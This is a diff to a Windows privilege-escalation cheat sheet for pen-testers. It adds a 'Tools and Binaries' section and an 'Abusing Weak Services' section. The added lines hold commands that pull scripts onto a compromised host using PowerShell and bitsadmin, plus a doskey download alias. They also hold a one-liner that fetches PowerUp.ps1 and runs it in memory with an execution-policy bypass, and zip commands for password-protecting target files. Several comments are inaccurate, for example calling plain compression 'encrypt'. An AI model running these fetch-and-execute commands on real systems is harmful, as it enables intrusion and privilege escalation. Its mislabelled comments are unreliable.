@@ -7,6 +7,10 @@ This document is meant for pen-testers, red teams, and the like.
 
 ** Needless to state: You're responosible for what you're doing :-)
 
+# Notes & Format
+- commands should be copiable from the boxes; windows inline command comments are noted as `command &:: comment`, so it still should work without messing your easy copy-paste style commands. Think of it as the hash # in Linux.
+- if two commands are required to run it's better to combine them into one line using the `&` delimiter 
+
 # Contributors
 - AK | Author and Maintainer [amAK.xyz](https://imAK.xyz), [@xxByte](https://twitter.com/xxByte)
 - You | Your Contribution [yourTwitter](https://twitter.com/xxByte)
@@ -139,16 +143,63 @@ Which processes are running as "system"
 
     tasklist /v /fi "username eq system"
 
-# Backdoors
-You've learned as much as you can about the system, now you will need to upload files to it for executing local exploits or running scripts that can enumirate services, schedules, and find weakness better than you.
-
-## Do you have powershell magic?
+Do you have powershell magic?
 
     REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
 
-## wget via PowerShell
 
-    powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs-scripts.zip -UseBasicParsing -OutFile scripts.zip"
+# Tools and Binaries
+In this section you will have the basic binaries to make your life a bit easier such as zip, unzip, wget, and the rest.
+These tools are meant to be used for local exploits or get other privilege-escalation scripts to do deeper scanning for you.
+
+## Unzip files
+Download the unzip binary for windows from [here](http://gnuwin32.sourceforge.net/packages/unzip.htm)
+Unzip it in your attacker host then serve /bin/unzip.exe via an http server to your target host
+
+    unzip.exe -h &::#usage
+    unzip.exe file.zip &::#extract
+
+## To zip files 
+same as above, the only difference is the binaries, you can get them [here](http://gnuwin32.sourceforge.net/packages/zip.htm)
+zip also has a dependency file called bzip2.dll, which has to be in the same folder.
+Once you have the binary and dependency dll on you can run:
+
+    zip -h &::#for usage
+    zip -9 out.zip file.txt file.jpg file.xls &::#encrypt files
+    zip -9 out.zip -r c:\some\directory\ &::#encrypt directory
+    zip -e -P PASSWORD_HERE -9 out.zip file1.txt file2.xls file3.jpg &::#for encryption with a password 
+    zip -e -P PASSWORD_HERE -9 -r c:\some\directory &::#same as above but for directories.
+
+## wget using PowerShell
+
+    powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs-scripts.zip -UseBasicParsing -OutFile %TEMP%\scripts.zip"
+
+## wget using bitsadmin (when powershell is not present)
+
+    cmd /c "bitsadmin /transfer myjob /download /priority high https://addaxsoft.com/downloadR/wpecs-scripts.zip %TEMP%\scripts.zip"
+
+## wget via command shortcut
+use `wget link`
+
+    doskey wget="cmd /c bitsadmin /transfer myjob /download /priority high $1 %TEMP%\scripts.zip"
+    wget https://addaxsoft.com/downloadR/wpecs-scripts.zip
+
+or using powershell; note: this might be broken at the moment
+
+    doskey wget="powershell -Noninteractive -NoProfile -command wget $1 -UseBasicParsing -OutFile %TEMP%\scripts.zip"
+    wget https://addaxsoft.com/downloadR/wpecs-scripts.zip
+
+# Abusing Weak Services
+this is the section where "shit gets real"
+If you have no powershell skip the first part of this section and go to the manual way
+if you do, you're in a bit of luck to automate this using PowerSploit > PrivEsc > PowerUp
+
+## Spot the weak service using PowerSploit's PowerUP
+Usage and details of this script can be found [here](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+
+    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+    
+
 
 -----
 
